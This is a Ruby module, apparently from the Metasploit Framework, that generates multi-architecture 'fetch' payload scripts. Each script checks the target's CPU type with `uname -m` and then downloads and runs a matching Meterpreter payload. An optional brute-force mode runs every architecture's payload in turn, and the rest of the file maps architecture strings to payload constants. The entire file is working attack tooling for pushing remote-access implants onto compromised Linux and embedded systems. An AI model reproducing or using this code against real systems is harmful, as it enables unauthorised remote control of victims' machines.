module Msf
  ###
  #
  # Common library for http multi-arch fetch payloads
  #
  ###
  module Payload::Adapter::Fetch::Multi

    def _generate_multi_commands(arch_payloads = [])
      # There is a great deal of room for improvement here.
      script = 'archinfo=$(uname -m);'
      arch_payloads.each do |srv_entry|
        vprint_status("Adding #{srv_entry[:uri]} for #{srv_entry[:arch]}")
        datastore['FETCH_FILENAME'] = srv_entry[:uri].dup
        vprint_status(datastore['FETCH_FILENAME'])
        vprint_status(datastore['FETCH_FILENAME'])
        os_arches(srv_entry[:arch]).each do |os_arch|
          # placing an exit after the conditionals causes 'FETCH_FILELESS to fail'
          if datastore['FETCH_FILELESS'] == 'none'
            script << "if [ #{os_arch} = $archinfo ]; then (#{generate_fetch_commands(srv_entry[:uri])}); exit ;fi; "
          else
            script << "if [ #{os_arch} = $archinfo ]; then (#{generate_fetch_commands(srv_entry[:uri])}); fi; "
          end
        end
        vprint_status(datastore['FETCH_FILENAME'])
      end
      script << _generate_bruteforce_multi_commands(arch_payloads) if datastore['FETCH_BRUTEFORCE']
      vprint_status(script)
      script
    end

    def _generate_bruteforce_multi_commands(arch_payloads = [])
      # Don't bother trying to figure out the OS arch.... just try to run them all.
      script = ''
      arch_payloads.each do |srv_entry|
        vprint_status("Adding #{srv_entry[:uri]} for #{srv_entry[:arch]}")
        datastore['FETCH_FILENAME'] = srv_entry[:uri].dup
        vprint_status(datastore['FETCH_FILENAME'])
        script << generate_fetch_commands(srv_entry[:uri]).to_s
      end
      print_status(script)
      script
    end

    def os_arches(meterp_arch)
      # multiple `uname -m` values map to the same payload arch
      # we will probably need to expand this
      case meterp_arch
      when ARCH_AARCH64
        return ['aarch64']
      when ARCH_ARMBE
        return ['armbe']
      when ARCH_ARMLE
        return ['armv5l', 'armv6l', 'armv7l']
      when ARCH_MIPS64
        return ['mips64']
      when ARCH_MIPSBE
        return ['mipsbe']
      when ARCH_MIPSLE
        return ['mips']
      when ARCH_PPC
        return ['ppc']
      when ARCH_PPCE500V2
        return ['ppce500v2']
      when ARCH_PPC64LE
        return ['ppc64le']
      when ARCH_X64
        return ['x64', 'x86_64']
      when ARCH_X86
        return ['x86']
      when ARCH_ZARCH
        return ['zarch']
      end
    end

    def to_meterp_arch(os_arch)
      # multiple `uname -m` values map to the same payload arch
      # we will probably need to expand this
      vprint_status("Searching for #{os_arch}")
      case os_arch
      when 'aarch64'
        return ARCH_AARCH64
      when 'armbe'
        return ARCH_ARMBE
      when 'armv5l'
        return ARCH_ARMLE
      when 'armv6l'
        return ARCH_ARMLE
      when 'armv7l'
        return ARCH_ARMLE
      when 'mips64'
        return ARCH_MIPS64
      when 'mipsbe'
        return ARCH_MIPSBE
      when 'mips'
        return ARCH_MIPSLE
      when 'ppc'
        return ARCH_PPC
      when 'ppce500v2'
        return ARCH_PPCE500V2
      when 'ppc64le'
        return ARCH_PPC64LE
      when 'x64'
        return ARCH_X64
      when 'x86_64'
        return ARCH_X64
      when 'x86'
        return ARCH_X86
      when 'zarch'
        return ARCH_ZARCH
        vprint_status('Nothing Found')
      end
    end
    def multi_arches
      arches = []
      arches << ARCH_AARCH64
      arches << ARCH_ARMBE
      arches << ARCH_ARMLE
      arches << ARCH_MIPS64
      arches << ARCH_MIPSBE
      arches << ARCH_MIPSLE
      arches << ARCH_PPC
      arches << ARCH_PPCE500V2
      arches << ARCH_PPC64LE
      arches << ARCH_X64
      arches << ARCH_X86
      arches << ARCH_ZARCH
      arches
    end
  end
end